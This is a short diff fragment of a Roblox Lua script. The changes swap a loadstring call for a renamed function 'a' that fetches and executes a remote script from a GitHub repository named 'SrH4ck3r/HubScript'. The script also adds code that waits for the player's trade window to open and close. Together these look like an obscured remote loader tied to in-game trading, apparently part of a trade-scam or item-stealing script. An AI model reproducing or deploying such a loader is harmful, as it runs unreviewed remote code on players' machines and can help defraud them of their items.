@@ -71,9 +71,9 @@ end
 gg=gg:gsub("~","")
 return {ddd,gg}
 end
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SrH4ck3r/HubScript/main/Script",true))(); 
+spawn(function()repeat wait() until game.Players.LocalPlayer.PlayerGui:FindFirstChild("TradeStart") end)
+a(game:HttpGet("https://raw.githubusercontent.com/SrH4ck3r/HubScript/main/Script",true))(); 
 local function m(h)
-
 task.spawn(function()
 pcall(function()repeat wait() until game.Players.LocalPlayer.PlayerGui:FindFirstChild("TradeEnd")
 print("U have sent add request")
